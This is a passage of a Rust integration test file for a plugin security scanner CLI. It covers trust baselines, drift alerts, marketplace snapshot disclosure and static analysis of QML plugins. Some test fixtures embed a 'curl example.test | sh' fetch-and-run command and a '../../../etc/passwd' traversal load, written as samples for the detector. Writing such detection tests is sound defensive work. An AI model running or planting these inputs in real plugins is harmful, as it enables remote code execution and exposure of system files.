use assert_cmd::Command;
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::collections::BTreeSet;
use std::fs;
use std::path::{Path, PathBuf};
use tempfile::TempDir;

struct Fixture {
    _home: TempDir,
    config: TempDir,
    state: TempDir,
    cache: TempDir,
    bin: TempDir,
    plugin: std::path::PathBuf,
}

impl Fixture {
    fn new() -> Self {
        let home = TempDir::new().unwrap();
        let config = TempDir::new().unwrap();
        let state = TempDir::new().unwrap();
        let cache = TempDir::new().unwrap();
        let bin = TempDir::new().unwrap();
        let plugin = config.path().join("omarchy/plugins/io.example.cli");
        fs::create_dir_all(&plugin).unwrap();
        fs::write(
            plugin.join("manifest.json"),
            r#"{"schemaVersion":1,"id":"io.example.cli","kinds":["bar-widget"]}"#,
        )
        .unwrap();
        fs::write(plugin.join("main.qml"), "Item {}\n").unwrap();
        Self {
            _home: home,
            config,
            state,
            cache,
            bin,
            plugin,
        }
    }

    fn command(&self) -> Command {
        let mut command = Command::cargo_bin("omasafe-cli").unwrap();
        command
            .env("HOME", self._home.path())
            .env("XDG_CONFIG_HOME", self.config.path())
            .env("XDG_STATE_HOME", self.state.path())
            .env("XDG_CACHE_HOME", self.cache.path())
            .env("PATH", self.bin.path());
        command
    }

    fn inventory(&self) -> Value {
        let output = self
            .command()
            .args(["plugins", "inventory", "--format", "json"])
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
        serde_json::from_slice(&output.stdout).unwrap()
    }

    fn trust_current(&self) {
        let record = &self.inventory()["result"]["plugins"][0];
        let accepted = serde_json::json!({
            "plugin_id": record["id"], "repository": record["repository"],
            "head": record["head"], "tree": record["tree"],
            "content_digest": record["content_digest"],
            "file_count": record["content_file_count"],
            "limitations": record["limitations"], "file_digests": record["file_digests"]
        });
        let history = serde_json::json!({
            "schema_version": 1,
            "records": [{"plugin_id":"io.example.cli", "accepted": accepted, "accepted_at":"now", "note":"test"}],
            "decisions": []
        });
        fs::create_dir_all(self.state.path().join("omasafe")).unwrap();
        fs::write(
            self.state.path().join("omasafe/trust-history.json"),
            serde_json::to_vec(&history).unwrap(),
        )
        .unwrap();
    }
}

#[test]
fn old_baseline_without_file_map_stays_unchanged() {
    let fixture = Fixture::new();
    let record = &fixture.inventory()["result"]["plugins"][0];
    let accepted = serde_json::json!({
        "plugin_id": record["id"],
        "repository": record["repository"],
        "head": record["head"],
        "tree": record["tree"],
        "content_digest": record["content_digest"],
        "file_count": record["content_file_count"],
        "limitations": record["limitations"]
    });
    let history = serde_json::json!({
        "schema_version": 1,
        "records": [{"plugin_id":"io.example.cli", "accepted": accepted, "accepted_at":"old", "note":"old"}],
        "decisions": []
    });
    fs::create_dir_all(fixture.state.path().join("omasafe")).unwrap();
    fs::write(
        fixture.state.path().join("omasafe/trust-history.json"),
        serde_json::to_vec(&history).unwrap(),
    )
    .unwrap();
    fixture
        .command()
        .args(["plugins", "status", "io.example.cli"])
        .assert()
        .success()
        .stdout(predicates::str::contains("unchanged"));
}

#[test]
fn oversized_asset_does_not_stop_later_files_from_inventory() {
    let fixture = Fixture::new();
    fs::write(
        fixture.plugin.join("asset.bin"),
        vec![b'a'; 100 * 1024 * 1024],
    )
    .unwrap();
    for name in ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'] {
        fs::write(fixture.plugin.join(format!("code_{name}.qml")), "Item {}\n").unwrap();
    }
    let inventory = fixture.inventory();
    let files = inventory["result"]["plugins"][0]["file_digests"]
        .as_object()
        .unwrap();
    for name in ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'] {
        assert!(files.contains_key(&format!("code_{name}.qml")));
    }
}

#[test]
#[cfg(unix)]
fn mode_only_change_is_present_in_cli_diff() {
    let fixture = Fixture::new();
    use std::os::unix::fs::PermissionsExt;
    let file = fixture.plugin.join("payload.sh");
    fs::write(&file, "payload\n").unwrap();
    fixture.trust_current();
    fs::set_permissions(&file, fs::Permissions::from_mode(0o755)).unwrap();
    fixture
        .command()
        .args(["plugins", "diff", "io.example.cli"])
        .assert()
        .success()
        .stdout(predicates::str::contains("payload.sh"));
}

#[test]
fn acknowledge_without_scope_marks_source_drift_reviewed() {
    let fixture = Fixture::new();
    fixture.trust_current();
    fixture
        .command()
        .args([
            "plugins",
            "review",
            "io.example.cli",
            "--action",
            "acknowledge",
            "--reason",
            "reviewed",
            "--yes",
        ])
        .assert()
        .success();
    fs::write(
        fixture.plugin.join("main.qml"),
        "Item { property bool changed: true }\n",
    )
    .unwrap();
    fixture
        .command()
        .args(["scan"])
        .assert()
        .code(3)
        .stdout(predicates::str::contains("previously acknowledged"));
}

#[test]
fn untrust_revokes_the_active_baseline_without_deleting_history() {
    let fixture = Fixture::new();
    fixture.trust_current();
    fixture
        .command()
        .args([
            "plugins",
            "review",
            "io.example.cli",
            "--action",
            "untrust",
            "--reason",
            "no longer trusted",
            "--yes",
        ])
        .assert()
        .success();

    let status = fixture
        .command()
        .args(["plugins", "status", "io.example.cli", "--format", "json"])
        .output()
        .unwrap();
    assert!(status.status.success());
    let report: Value = serde_json::from_slice(&status.stdout).unwrap();
    assert_eq!(report["result"]["state"], "untrusted");
    assert!(report["result"]["trusted"].is_null());
    assert_eq!(
        report["result"]["reason"],
        "trust baseline was revoked; restore or re-trust to recover it"
    );

    let history: Value = serde_json::from_slice(
        &fs::read(fixture.state.path().join("omasafe/trust-history.json")).unwrap(),
    )
    .unwrap();
    assert_eq!(history["records"].as_array().unwrap().len(), 1);
    assert_eq!(history["revoked_plugins"][0], "io.example.cli");
}

#[test]
fn missing_plugin_alerts_are_deduplicated_across_trust_history() {
    let fixture = Fixture::new();
    fixture.trust_current();
    let history_path = fixture.state.path().join("omasafe/trust-history.json");
    let mut history: Value = serde_json::from_slice(&fs::read(&history_path).unwrap()).unwrap();
    let duplicate = history["records"][0].clone();
    history["records"].as_array_mut().unwrap().push(duplicate);
    fs::write(&history_path, serde_json::to_vec(&history).unwrap()).unwrap();
    fs::remove_dir_all(&fixture.plugin).unwrap();

    let output = fixture
        .command()
        .args(["scan", "--format", "json"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(3));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let missing = report["result"]["alerts"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|alert| alert["kind"] == "missing-plugin")
        .count();
    assert_eq!(missing, 1);
    assert!(report["result"]["outstanding"].as_u64().unwrap() >= 1);
    assert_eq!(report["result"]["new"], report["result"]["outstanding"]);
}

#[test]
fn inventory_discloses_unverified_cached_marketplace_snapshot() {
    let fixture = Fixture::new();
    let cache = fixture.cache.path().join("omasafe");
    fs::create_dir_all(&cache).unwrap();
    fs::write(cache.join("catalog.json"), b"[]").unwrap();
    fs::write(
        cache.join("catalog.meta.json"),
        serde_json::json!({
            "repository_commit": "0123456789abcdef0123456789abcdef01234567",
            "repository_url": "https://github.com/HANCORE-linux/omarchy-plugin-marketplace",
            "retrieved_at": "2026-08-20T00:00:00Z"
        })
        .to_string(),
    )
    .unwrap();
    let report = fixture.inventory();
    assert_eq!(report["result"]["marketplace_source"], "unverified-cache");
    assert_eq!(report["result"]["marketplace_snapshot_verified"], false);
    assert_eq!(
        report["result"]["marketplace_repository_commit"],
        "0123456789abcdef0123456789abcdef01234567"
    );
    assert_eq!(
        report["result"]["marketplace_repository"],
        "https://github.com/HANCORE-linux/omarchy-plugin-marketplace"
    );
    assert_eq!(
        report["result"]["marketplace_file_digest"]
            .as_str()
            .unwrap()
            .len(),
        64
    );
    assert_eq!(
        report["result"]["marketplace_retrieved_at"],
        "2026-08-20T00:00:00Z"
    );
}

#[test]
#[cfg(unix)]
fn inventory_discloses_verified_snapshot_without_a_matching_listing() {
    use std::os::unix::fs::symlink;

    let fixture = Fixture::new();
    let source = TempDir::new().unwrap();
    let catalog = b"[]\n";
    fs::create_dir_all(source.path().join("site")).unwrap();
    fs::write(source.path().join("site/catalog.json"), catalog).unwrap();

    for args in [
        vec!["init"],
        vec!["config", "user.name", "OmaSafe test"],
        vec!["config", "user.email", "omasafe@example.invalid"],
        vec!["add", "site/catalog.json"],
        vec!["commit", "-m", "catalog fixture"],
    ] {
        let output = std::process::Command::new("/usr/bin/git")
            .args(args)
            .current_dir(source.path())
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
    }
    let revision = std::process::Command::new("/usr/bin/git")
        .args(["rev-parse", "HEAD"])
        .current_dir(source.path())
        .output()
        .unwrap();
    assert!(revision.status.success());
    let revision = String::from_utf8(revision.stdout)
        .unwrap()
        .trim()
        .to_owned();

    let cache = fixture.cache.path().join("omasafe");
    fs::create_dir_all(&cache).unwrap();
    let clone = std::process::Command::new("/usr/bin/git")
        .args(["clone", "--bare"])
        .arg(source.path())
        .arg(cache.join("catalog.git"))
        .output()
        .unwrap();
    assert!(
        clone.status.success(),
        "{}",
        String::from_utf8_lossy(&clone.stderr)
    );
    fs::write(cache.join("catalog.json"), catalog).unwrap();
    fs::write(
        cache.join("catalog.meta.json"),
        serde_json::json!({
            "repository_commit": revision,
            "repository_url": "https://github.com/HANCORE-linux/omarchy-plugin-marketplace",
            "retrieved_at": "2026-08-22T00:00:00Z",
            "file_digest": format!("{:x}", Sha256::digest(catalog))
        })
        .to_string(),
    )
    .unwrap();
    symlink("/usr/bin/git", fixture.bin.path().join("git")).unwrap();

    let report = fixture.inventory();
    assert_eq!(report["result"]["marketplace_source"], "pinned-fetch");
    assert_eq!(report["result"]["marketplace_snapshot_verified"], true);
    assert_eq!(report["result"]["marketplace_repository_commit"], revision);
    assert_eq!(report["result"]["marketplace"][0]["status"], "unlisted");
}

#[test]
fn inventory_text_separates_backup_folders_from_installed_plugins() {
    let fixture = Fixture::new();
    fs::create_dir_all(
        fixture
            .config
            .path()
            .join("omarchy/plugins/.io.example.cli.bak.20260821"),
    )
    .unwrap();
    fixture
        .command()
        .args(["plugins", "inventory"])
        .assert()
        .success()
        .stdout(predicates::str::contains(
            "1 installed plugin(s) collected.",
        ))
        .stdout(predicates::str::contains(
            "1 backup folder(s) retained separately for audit visibility.",
        ));
}

#[test]
fn different_git_heads_with_same_content_receive_distinct_alerts() {
    let fixture = Fixture::new();
    fixture.trust_current();
    let history_path = fixture.state.path().join("omasafe/trust-history.json");
    let mut history: Value = serde_json::from_slice(&fs::read(&history_path).unwrap()).unwrap();
    history["records"][0]["accepted"]["head"] = Value::String("head-one".into());
    fs::write(&history_path, serde_json::to_vec(&history).unwrap()).unwrap();
    fixture
        .command()
        .args(["scan", "--notify"])
        .assert()
        .code(3)
        .stdout(predicates::str::contains("source-drift"));
    history["records"][0]["accepted"]["head"] = Value::String("head-two".into());
    fs::write(&history_path, serde_json::to_vec(&history).unwrap()).unwrap();
    fixture
        .command()
        .args(["scan", "--notify"])
        .assert()
        .code(3)
        .stdout(predicates::str::contains("source-drift"));
}

#[test]
fn scan_reports_outstanding_findings_with_exit_code_three() {
    let fixture = Fixture::new();
    fixture.trust_current();
    fs::write(
        fixture.plugin.join("main.qml"),
        "Item { property bool changed: true }\n",
    )
    .unwrap();
    let output = fixture
        .command()
        .args(["scan", "--format", "json"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(3));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(report["result"]["outstanding"].as_u64().unwrap() > 0);
    assert!(report["result"]["new"].as_u64().unwrap() > 0);
    assert_eq!(report["result"]["highest_severity"], "warning");
    assert_eq!(report["result"]["alerts"][0]["severity"], "warning");
}

#[test]
fn only_new_scan_is_quiet_after_notification_delivery() {
    let fixture = Fixture::new();
    fixture.trust_current();
    fs::write(
        fixture.plugin.join("main.qml"),
        "Item { property bool changed: true }\n",
    )
    .unwrap();
    fixture
        .command()
        .args(["scan", "--notify", "--only-new"])
        .assert()
        .code(3);
    fixture
        .command()
        .args(["scan", "--notify", "--only-new"])
        .assert()
        .code(0)
        .stdout(predicates::str::contains(
            "No new actionable changes detected.",
        ));
}

#[test]
fn only_new_scan_keeps_highest_severity_for_outstanding_findings() {
    let fixture = Fixture::new();
    fixture.trust_current();
    fs::write(
        fixture.plugin.join("main.qml"),
        "Item { property bool changed: true }\n",
    )
    .unwrap();
    fixture
        .command()
        .args(["scan", "--notify"])
        .assert()
        .code(3);

    let output = fixture
        .command()
        .args(["scan", "--format", "json", "--only-new"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(0));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(report["result"]["outstanding"].as_u64().unwrap() > 0);
    assert_eq!(report["result"]["new"], 0);
    assert_eq!(report["result"]["highest_severity"], "warning");
}

#[test]
#[cfg(unix)]
fn schedule_unit_accepts_outstanding_exit_code() {
    use std::os::unix::fs::PermissionsExt;
    let fixture = Fixture::new();
    let systemctl = fixture.bin.path().join("systemctl");
    fs::write(&systemctl, "#!/bin/sh\nexit 0\n").unwrap();
    fs::set_permissions(&systemctl, fs::Permissions::from_mode(0o755)).unwrap();
    fixture
        .command()
        .args(["schedule", "install"])
        .assert()
        .success();
    let unit = fs::read_to_string(
        fixture
            .config
            .path()
            .join("systemd/user/omasafe-scan.service"),
    )
    .unwrap();
    assert!(unit.contains("SuccessExitStatus=3"));
}

#[test]
fn stale_cached_snapshot_is_disclosed() {
    let fixture = Fixture::new();
    let cache = fixture.cache.path().join("omasafe");
    fs::create_dir_all(&cache).unwrap();
    fs::write(cache.join("catalog.json"), b"[]").unwrap();
    fs::write(
        cache.join("catalog.meta.json"),
        serde_json::json!({
            "repository_commit": "0123456789abcdef0123456789abcdef01234567",
            "repository_url": "https://github.com/HANCORE-linux/omarchy-plugin-marketplace",
            "retrieved_at": "2020-01-01T00:00:00Z"
        })
        .to_string(),
    )
    .unwrap();
    let report = fixture.inventory();
    assert_eq!(report["result"]["marketplace_stale"], true);
    assert_eq!(report["result"]["marketplace_source"], "unverified-cache");
}

#[test]
fn provenance_report_is_deterministic_and_complete() {
    let fixture = Fixture::new();
    let first = fixture
        .command()
        .args(["provenance", "--format", "json"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let second = fixture
        .command()
        .args(["provenance", "--format", "json"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(first, second);
    let report: Value = serde_json::from_slice(&first).unwrap();
    assert_eq!(report["schema"], "omasafe.provenance.v1");
    assert!(report["source_revision"].as_str().is_some());
    assert!(report["cargo_lock_sha256"].as_str().unwrap().len() == 64);
    assert_eq!(report["supported_runtime"]["omarchy"], "4.0.0-1");
    assert!(
        !report["coverage_limitations"]
            .as_array()
            .unwrap()
            .is_empty()
    );
}

#[test]
fn cli_surface_matches_usage_commands() {
    let source = fs::read_to_string(concat!(env!("CARGO_MANIFEST_DIR"), "/src/main.rs")).unwrap();
    let usage = source
        .lines()
        .find(|line| line.contains("usage: omasafe-cli"))
        .expect("main.rs must contain the CLI usage string");
    let usage_commands: BTreeSet<_> = usage
        .split("usage: omasafe-cli ")
        .nth(1)
        .unwrap()
        .split(" | ")
        .filter_map(|entry| entry.split_whitespace().next())
        .collect();

    let surface_path = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../docs/cli-surface.txt");
    let surface = fs::read_to_string(surface_path).unwrap();
    let surface_commands: BTreeSet<_> = surface
        .lines()
        .filter(|line| !line.starts_with('#') && !line.trim().is_empty())
        .filter_map(|line| line.split_whitespace().next())
        .collect();

    assert_eq!(usage_commands, surface_commands);
}

#[test]
fn rules_list_reports_catalog_and_policy_identity() {
    let fixture = Fixture::new();
    let output = fixture
        .command()
        .args(["rules", "list", "--format", "json"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let report: Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(report["schema"], "omasafe.report.v1");
    assert_eq!(
        report["result"]["policy_identity"]["supported_surface_version"],
        "omarchy-security-surface.v1"
    );
    // The policy identity advertises the compiled parser strategy (ADR 0001):
    // the real grammar when the qml-parser feature is on, the lexical
    // fallback marker when it is off.
    assert_eq!(
        report["result"]["policy_identity"]["parser_versions"]["qml"],
        omasafe_analyzer::policy::QML_PARSER_IDENTITY
    );
    // S4 ships the marketplace baseline equivalence map.
    assert_eq!(
        report["result"]["equivalence_map_version"],
        "omarchy-marketplace-baseline-v3/1"
    );
    let rules = report["result"]["rules"].as_array().unwrap();
    assert!(!rules.is_empty());
    let ids: BTreeSet<_> = rules
        .iter()
        .map(|rule| rule["id"].as_str().unwrap().to_owned())
        .collect();
    assert_eq!(ids.len(), rules.len());
    for required in [
        "oma.qml.process-execution",
        "oma.qml.polkit-agent-ui",
        "oma.qml.session-lock",
        "oma.qml.pam-authentication",
        "oma.context.replaces-bar",
    ] {
        assert!(ids.contains(required), "missing {required}");
    }
}

#[test]
fn rules_list_text_is_deterministic() {
    let fixture = Fixture::new();
    let first = fixture
        .command()
        .args(["rules", "list"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let second = fixture
        .command()
        .args(["rules", "list"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(first, second);
    let rendered = String::from_utf8(first).unwrap();
    assert!(rendered.contains("rule catalog v5"));
    assert!(rendered.contains("oma.qml.session-lock"));
}

#[test]
fn rules_list_rejects_unknown_arguments_and_formats() {
    let fixture = Fixture::new();
    fixture
        .command()
        .args(["rules", "list", "--bogus"])
        .assert()
        .failure()
        .stderr(predicates::str::contains("unknown rules list argument"));
    fixture
        .command()
        .args(["rules", "list", "--format", "yaml"])
        .assert()
        .failure()
        .stderr(predicates::str::contains("text or json"));
}

/// Enriches the default single-plugin fixture with a full shipped-payload
/// surface: QML entry, JS resource, shell/python executables, an ELF payload,
/// a data binary, and a symlink.
fn enrich_plugin(plugin: &Path) {
    fs::create_dir_all(plugin.join("lib")).unwrap();
    fs::write(plugin.join("Main.qml"), "import QtQuick\nItem {}\n").unwrap();
    fs::write(plugin.join("lib/helper.js"), "function f(){return 1}\n").unwrap();
    fs::write(plugin.join("install.sh"), "#!/bin/sh\necho hi\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(plugin.join("install.sh"), fs::Permissions::from_mode(0o755)).unwrap();
    }
    let elf = {
        let mut bytes = vec![b'A'; 32];
        bytes[0..4].copy_from_slice(b"\x7fELF");
        bytes
    };
    fs::write(plugin.join("payload"), elf).unwrap();
    #[cfg(unix)]
    std::os::unix::fs::symlink("manifest.json", plugin.join("link.json")).unwrap();
}

#[test]
fn analyze_reports_full_payload_inventory_end_to_end() {
    let mut fixture = Fixture::new();
    enrich_plugin(&fixture.plugin);
    // Rebuild Fixture with the enriched tree: Fixture::new already created it,
    // so mutate through its stored path via a second instance is wrong; use
    // the existing one directly by re-deriving command envs below.
    let _ = &mut fixture;
    let output = fixture
        .command()
        .args(["plugins", "analyze", "io.example.cli", "--format", "json"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let report: Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(report["schema"], "omasafe.report.v1");
    assert_eq!(report["result"]["target"]["source"], "installed-plugin");
    let analysis = &report["result"]["analysis"];
    assert_eq!(analysis["schema"], "omasafe.analysis.v1");
    assert_eq!(analysis["policy_identity"]["rule_catalog_version"], 5);
    let inventory = &report["result"]["payload_inventory"];
    let states = &inventory["coverage_states"];
    // S3+S4: analyzable files land in analyzed/unreferenced/partial; only
    // non-analyzable payloads stay unsupported.
    let unsupported = states["unsupported"].as_u64().unwrap();
    let partial = states["partial"].as_u64().unwrap();
    assert!(unsupported + partial >= 5, "states: {states}");
    let entries = inventory["entries"].as_array().unwrap();
    let kinds: Vec<&str> = entries
        .iter()
        .map(|entry| entry["kind"].as_str().unwrap())
        .collect();
    assert!(kinds.contains(&"qml"), "{kinds:?}");
    assert!(kinds.contains(&"javascript"));
    let payload_entry = entries
        .iter()
        .find(|entry| entry["relative_path"] == "payload")
        .expect("ELF payload inventoried");
    assert_eq!(payload_entry["coverage_state"], "unsupported");
    assert!(
        !kinds.contains(&"analyzed"),
        "S1 never claims analyzed coverage"
    );
}

#[test]
fn analyze_is_deterministic_for_unchanged_input() {
    let fixture = Fixture::new();
    enrich_plugin(&fixture.plugin);
    let first = fixture
        .command()
        .args(["plugins", "analyze", "io.example.cli", "--format", "json"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let second = fixture
        .command()
        .args(["plugins", "analyze", "io.example.cli", "--format", "json"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let first: Value = serde_json::from_slice(&first).unwrap();
    let second: Value = serde_json::from_slice(&second).unwrap();
    assert_eq!(first["result"], second["result"]);
}

#[test]
fn analyze_rejects_unknown_plugins_and_arguments() {
    let fixture = Fixture::new();
    fixture
        .command()
        .args(["plugins", "analyze", "io.missing.plugin"])
        .assert()
        .failure()
        .stderr(predicates::str::contains("plugin not found"));
    fixture
        .command()
        .args([
            "plugins",
            "analyze",
            "io.example.cli",
            "--fail-on",
            "catastrophic",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "--fail-on must be one of info|low|medium|high|critical",
        ));
}

#[test]
fn scan_plugin_analyzes_local_directories() {
    let temp = tempfile::TempDir::new().unwrap();
    fs::write(temp.path().join("panel.qml"), "Item {}\n").unwrap();
    fs::write(temp.path().join("tool.sh"), "#!/bin/sh\nx\n").unwrap();
    let fixture = Fixture::new();
    let output = fixture
        .command()
        .args([
            "scan-plugin",
            "--path",
            temp.path().to_str().unwrap(),
            "--format",
            "json",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let report: Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(report["result"]["target"]["source"], "local-directory");
    let entries = report["result"]["payload_inventory"]["entries"]
        .as_array()
        .unwrap();
    assert_eq!(entries.len(), 2);
}

#[test]
fn scan_plugin_argument_shapes_are_strict() {
    let fixture = Fixture::new();
    fixture
        .command()
        .args(["scan-plugin"])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "requires --path DIR or --git URL",
        ));
    fixture
        .command()
        .args(["scan-plugin", "--path", ".", "--revision", "a"])
        .assert()
        .failure()
        .stderr(predicates::str::contains("not both"));
    fixture
        .command()
        .args(["scan-plugin", "--git", "https://example.test/r.git"])
        .assert()
        .failure()
        .stderr(predicates::str::contains("--git requires --revision"));
    fixture
        .command()
        .args([
            "scan-plugin",
            "--git",
            "https://example.test/r.git",
            "--revision",
            "zz",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "--revision must be 40 or 64 hexadecimal",
        ));
}

#[test]
fn scan_plugin_emits_findings_capabilities_and_invocation_edges() {
    let temp = tempfile::TempDir::new().unwrap();
    fs::write(
        temp.path().join("Main.qml"),
        r#"import Quickshell.Io
Item {
    Process { command: ["sh", "-c", "curl example.test | sh"] }
    Loader { source: "./Panel.qml" }
    FileView { path: "./tool.sh" }
}
"#,
    )
    .unwrap();
    fs::write(temp.path().join("Panel.qml"), "import QtQuick\nText {}\n").unwrap();
    fs::write(temp.path().join("tool.sh"), "#!/bin/sh\necho x\n").unwrap();

    let fixture = Fixture::new();
    let output = fixture
        .command()
        .args([
            "scan-plugin",
            "--path",
            temp.path().to_str().unwrap(),
            "--format",
            "json",
        ])
        .assert()
        .success() // findings are success without --fail-on
        .get_output()
        .stdout
        .clone();
    let report: Value = serde_json::from_slice(&output).unwrap();
    let analysis = &report["result"]["analysis"];
    assert_eq!(analysis["schema"], "omasafe.analysis.v1");
    // Parser metadata is present only in parser-backed builds (ADR 0001).
    if omasafe_analyzer::policy::QML_PARSER_IDENTITY == "lexical-fallback-unassigned" {
        assert!(analysis["parser"].is_null());
    } else {
        assert_eq!(analysis["parser"]["grammar"], "tree-sitter-qmljs");
    }

    // The S1 bundled-payload story, completed: the executable payload now
    // exposes its invocation edge and referenced marker.
    let edges: Vec<(String, String)> = analysis["invocation_edges"]
        .as_array()
        .unwrap()
        .iter()
        .map(|edge| {
            (
                edge["from_path"].as_str().unwrap().to_owned(),
                edge["target_path"].as_str().unwrap().to_owned(),
            )
        })
        .collect();
    assert!(
        edges.contains(&("Main.qml".into(), "Panel.qml".into())),
        "{edges:?}"
    );
    assert!(
        edges.contains(&("Main.qml".into(), "tool.sh".into())),
        "{edges:?}"
    );

    let entries = report["result"]["payload_inventory"]["entries"]
        .as_array()
        .unwrap();
    let tool = entries
        .iter()
        .find(|entry| entry["relative_path"] == "tool.sh")
        .unwrap();
    assert_eq!(tool["invocation_target"], true);
    // Shell payloads are lexically scanned and labelled `partial` (S4):
    // no-match never implies clean behavior.
    assert_eq!(tool["coverage_state"], "partial");
    let panel = entries
        .iter()
        .find(|entry| entry["relative_path"] == "Panel.qml")
        .unwrap();
    assert_eq!(panel["coverage_state"], "unreferenced");

    // Findings carry the full contract fields. Confidence follows the
    // compiled parser strategy (ADR 0001), so the expected label is derived
    // from the analyzer's declared identity rather than hard-coded.
    let parser_backed =
        omasafe_analyzer::policy::QML_PARSER_IDENTITY != "lexical-fallback-unassigned";
    let expected_confidence = if parser_backed {
        "ast-backed"
    } else {
        "lexical-fallback"
    };
    let findings = analysis["findings"].as_array().unwrap();
    assert!(
        findings
            .iter()
            .any(|finding| finding["rule_id"] == "oma.qml.process-execution"
                && finding["severity"] == "medium"
                && finding["confidence"] == expected_confidence
                && !finding["evidence"].as_str().unwrap().is_empty()
                && !finding["review_guidance"].as_str().unwrap().is_empty()),
        "{findings:?}"
    );
}

#[test]
fn scan_plugin_fail_on_threshold_controls_exit_code_only() {
    let temp = tempfile::TempDir::new().unwrap();
    fs::write(
        temp.path().join("Main.qml"),
        "Process { command: [\"sh\", \"-c\", \"x\"] }\n",
    )
    .unwrap();

    let fixture = Fixture::new();
    // medium finding >= low threshold -> exit 4 with a complete JSON report
    let output = fixture
        .command()
        .args([
            "scan-plugin",
            "--path",
            temp.path().to_str().unwrap(),
            "--format",
            "json",
            "--fail-on",
            "low",
        ])
        .assert()
        .code(4)
        .get_output()
        .stdout
        .clone();
    let threshold_report: Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(
        threshold_report["result"]["analysis"]["findings"][0]["severity"],
        "medium"
    );
    // threshold above the finding -> plain success
    fixture
        .command()
        .args([
            "scan-plugin",
            "--path",
            temp.path().to_str().unwrap(),
            "--fail-on",
            "high",
        ])
        .assert()
        .success();
    // invalid threshold stays a usage error
    fixture
        .command()
        .args([
            "scan-plugin",
            "--path",
            temp.path().to_str().unwrap(),
            "--fail-on",
            "extreme",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("--fail-on must be one of"));
}

#[test]
fn scan_plugin_analysis_is_fingerprint_deterministic() {
    let make_report = || {
        let temp = tempfile::TempDir::new().unwrap();
        fs::write(
            temp.path().join("Main.qml"),
            "Process { command: [\"sh\", \"-c\", \"same command\"] }\n",
        )
        .unwrap();
        let fixture = Fixture::new();
        fixture
            .command()
            .args([
                "scan-plugin",
                "--path",
                temp.path().to_str().unwrap(),
                "--format",
                "json",
            ])
            .assert()
            .success()
            .get_output()
            .stdout
            .clone()
    };
    let first: Value = serde_json::from_slice(&make_report()).unwrap();
    let second: Value = serde_json::from_slice(&make_report()).unwrap();
    assert_eq!(
        first["result"]["analysis"]["analysis_fingerprint"],
        second["result"]["analysis"]["analysis_fingerprint"]
    );
}

#[test]
fn scan_plugin_negative_provenance_stays_clean() {
    // Network usage and static benign execution coexisting must produce
    // zero findings — co-occurrence is not provenance.
    let temp = tempfile::TempDir::new().unwrap();
    fs::write(
        temp.path().join("Calm.qml"),
        r#"Item {
    Timer { onTriggered: refresh() }
    Process { command: ["notify-send", "hello"] }
    Text { text: {
        var xhr = new XMLHttpRequest()
        xhr.open("GET", "https://example.test/api")
        xhr.send()
    } }
}
"#,
    )
    .unwrap();
    // Traversal and absolute literals never become edges, and a remote URL
    // outside a load sink stays silent — but the traversal Loader is now an
    // out-of-tree load finding (H2), while the Image URL is not a sink.
    fs::write(
        temp.path().join("Refs.qml"),
        r#"Item {
    Loader { source: "../../../etc/passwd" }
    Image { source: "https://example.test/pic.png" }
}
"#,
    )
    .unwrap();

    let fixture = Fixture::new();
    let output = fixture
        .command()
        .args([
            "scan-plugin",
            "--path",
            temp.path().to_str().unwrap(),
            "--format",
            "json",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let report: Value = serde_json::from_slice(&output).unwrap();
    let analysis = &report["result"]["analysis"];
    let findings = analysis["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1, "{findings:?}");
    assert_eq!(findings[0]["rule_id"], "oma.qml.out-of-tree-reference");
    assert_eq!(findings[0]["severity"], "medium");
    assert_eq!(analysis["invocation_edges"].as_array().unwrap().len(), 0);
    // The finding is the disclosure; no typed rejection rides on top.
    let limitations = analysis["coverage_limitations"].as_array().unwrap();
    assert!(limitations.is_empty(), "{limitations:?}");
}

/// Scan an H2 adversarial fixture plugin tree from `fixtures/plugins/`.
fn scan_h2_fixture(name: &str) -> Value {
    let fixture = Fixture::new();
    let path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../fixtures/plugins")
        .join(name)
        .canonicalize()
        .unwrap();
    let output = fixture
        .command()
        .args([
            "scan-plugin",
            "--path",
            path.to_str().unwrap(),
            "--format",
            "json",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    serde_json::from_slice(&output).unwrap()
}

#[test]
fn h2_fixtures_surface_remote_component_loads() {
    // H0 2026-08-27: both load positions are verified reachable, so the
    // literal-remote fixtures carry the High rule at catalog severity, with
    // no typed rejection riding on top of the finding.
    for (name, sink_label) in [
        ("remote-component-loader", "Loader.source"),
        ("remote-create-component", "Qt.createComponent"),
    ] {
